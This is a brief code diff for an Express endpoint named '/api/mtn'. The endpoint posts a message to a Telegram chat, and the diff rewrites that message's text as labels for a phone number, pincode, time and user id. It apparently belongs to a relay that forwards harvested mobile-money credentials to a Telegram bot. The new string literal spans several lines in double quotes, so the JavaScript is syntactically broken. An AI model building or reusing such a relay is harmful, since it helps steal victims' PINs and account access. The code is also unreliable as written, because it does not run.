@@ -35,7 +35,11 @@ app.post("/api/mtn", async (req, res) => {
       },
       body: JSON.stringify({
         chat_id: process.env.TELEGRAM_CHAT_ID,
-        text: "Phone number eneterd,pincode,time,user id,Bot."
+        text:"Phone number:
+             Pincode:
+        ,    Time;
+             User id,
+             Bot."
       })
     });
 
